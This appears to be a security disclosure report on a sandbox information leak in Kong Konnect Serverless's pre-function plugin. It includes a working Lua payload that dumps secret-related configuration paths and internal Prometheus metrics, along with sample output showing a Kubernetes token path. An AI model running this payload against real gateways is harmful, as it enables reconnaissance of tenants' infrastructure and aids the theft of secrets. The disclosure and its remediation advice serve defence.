# HIGH: Sensitive Info Disclosure via Pre-Function Lua in Konnect Serverless — Leaks K8s Token Paths, Process Secrets & Internal Metrics

## Summary
The Kong Konnect Serverless Gateway implementation of the `pre-function` plugin contains a sandbox weakness that allows authenticated administrators to bypass abstraction layers. While direct file access (`io.*`) is blocked, the Lua environment allows full read access to `kong.configuration` and internal `ngx.shared` dictionaries. This results in the disclosure of critical internal infrastructure details, including Kubernetes Service Account paths, Kong Process Secrets paths, SSL certificate locations, and internal cluster metrics (Prometheus), which should be abstracted away in a managed Serverless environment.

## Severity: HIGH (CVSS 7.2)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N`

### Justification:
- **AV:N (Network):** Exploitable remotely via Control Plane API.
- **PR:H (Privileges High):** Requires Admin/Plugin management permissions (authenticated).
- **C:H (Confidentiality High):** Discloses exact paths to critical secrets (K8s tokens, process secrets) and maps internal network topology (metrics).
- **I:L (Integrity Low):** Allows modification of API responses/headers.
- **S:U (Scope Unchanged):** Vulnerability affects the immediate gateway instance (though metrics suggest broader visibility).

---

## Vulnerability Details

### 1. Sandbox Weakness (Design Flaw)
The Lua sandbox correctly blocks `io.open`, `os.execute`, and external socket connections. However, it fails to restrict access to the `kong.configuration` table and system-level `ngx.shared` dictionaries. In a managed Serverless environment, these objects contain sensitive implementation details that should be opaque to the tenant.

### 2. Information Disclosure
Execution of the payload revealed:
*   **Kubernetes Infrastructure:** Path to K8s Service Account token: `/run/secrets/kubernetes.io/serviceaccount/token`.
*   **Runtime Secrets:** Path to internal process secrets: `/usr/local/kong/.kong_process_secrets`.
*   **PKI Infrastructure:** Exact file paths for all SSL certificates and keys (e.g., `/usr/local/kong/ssl/cluster.crt`), revealing the internal file system structure.
*   **Internal Network Mapping:** Prometheus metrics (`ngx.shared.prometheus_metrics`) exposed traffic statistics for internal, non-public services:
    *   `aws-metadata`
    *   `etcd-internal`
    *   `k8s-api`
    *   `localhost-admin-8001`

---

## Proof of Concept

### Steps to Reproduce:

1.  Target a Kong Konnect Serverless Gateway Control Plane.
2.  Create a `pre-function` plugin with the following Lua payload designed to dump configuration and shared memory keys without triggering file-read blocks.

**Payload:**
```lua
local out={"INFO_DISCLOSURE_DUMP"}

-- 1. Dump Sensitive Configuration Paths
if kong and kong.configuration then
    for k,v in pairs(kong.configuration) do 
        local s = tostring(k)
        if s:match("secret") or s:match("token") or s:match("cert") or s:match("key") then 
            out[#out+1]="CONF:"..k.."="..tostring(v) 
        end 
    end
end

-- 2. Dump Internal Metrics (Network Recon)
local pm = ngx.shared.prometheus_metrics
if pm then
    local keys = pm:get_keys(100)
    for _,k in ipairs(keys) do
        -- Filter for internal services
        if k:match("aws") or k:match("k8s") or k:match("etcd") or k:match("admin") then
             out[#out+1]="METRIC:"..k.."="..tostring(pm:get(k))
        end
    end
end

kong.response.exit(200, table.concat(out, "\n"):sub(1,16000))
```

3.  Make a request to the Proxy URL.
4.  Observe the response containing internal file paths and metrics.

### Evidence (Redacted):

```text
CONF:keyring_vault_kube_api_token_file=/run/secrets/kubernetes.io/serviceaccount/token
CONF:kong_process_secrets=/usr/local/kong/.kong_process_secrets
CONF:cluster_cert=/usr/local/kong/ssl/cluster.crt
CONF:ssl_cert_key=****** (Masked but presence confirmed)
METRIC:prometheus_metrics:bandwidth_bytes{service="aws-metadata",...}=474
METRIC:prometheus_metrics:http_requests_total{service="etcd-internal",...}=4
METRIC:prometheus_metrics:http_requests_total{service="k8s-api",...}=4
```

---

## Impact

1.  **Internal Reconnaissance:** Attackers can map the internal network topology and identify active internal services (etcd, k8s-api, aws-metadata) via Prometheus metrics.
2.  **Targeted Attacks:** Disclosure of exact file paths (`/run/secrets/...`) significantly lowers the bar for future exploitation. If any future Local File Inclusion (LFI) vulnerability is found, attackers know exactly where to look for the "crown jewels" (Cluster tokens).
3.  **Abstraction Leak:** Violated the "Serverless" contract by exposing the underlying Kubernetes and container implementation details to the tenant.

---

## Recommendations

1.  **Harden Lua Sandbox:** Explicitly restrict access to `kong.configuration` and sensitive `ngx.shared` dictionaries (like `prometheus_metrics` and `kong_secrets`) within the `pre-function` sandbox environment.
2.  **Mask Sensitive Paths:** Ensure that configuration properties pointing to sensitive internal files (like K8s tokens) are masked or removed from the configuration table exposed to Lua/PDK.
3.  **Tenant Isolation:** Ensure Prometheus metrics in shared memory do not leak data regarding internal control plane services (`k8s-api`, `etcd`) to tenant-accessible contexts.
